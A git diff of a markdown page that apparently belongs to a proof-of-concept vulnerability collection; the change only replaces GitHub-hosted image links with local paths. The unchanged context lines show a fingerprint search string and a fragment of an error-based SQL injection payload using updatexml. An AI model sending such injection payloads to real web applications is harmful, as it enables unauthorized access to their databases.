@@ -6,7 +6,7 @@
 body="zhuya/js/base.js"
 ```
 
-![image](https://github.com/wy876/POC/assets/139549762/fc89004e-3d6d-43b5-9d00-628468cb3d7a)
+![image](../../images/fc89004e-3d6d-43b5-9d00-628468cb3d7a.png)
 
 ## poc
 ```
@@ -20,4 +20,4 @@ data=123456&id=1 and updatexml(1,concat(0x7e,md5(123),0x7e),1)
 ```
 
 
-![image](https://github.com/wy876/POC/assets/139549762/c0c54626-76ac-440a-97be-760bb17c61cb)
+![image](../../images/c0c54626-76ac-440a-97be-760bb17c61cb.png)
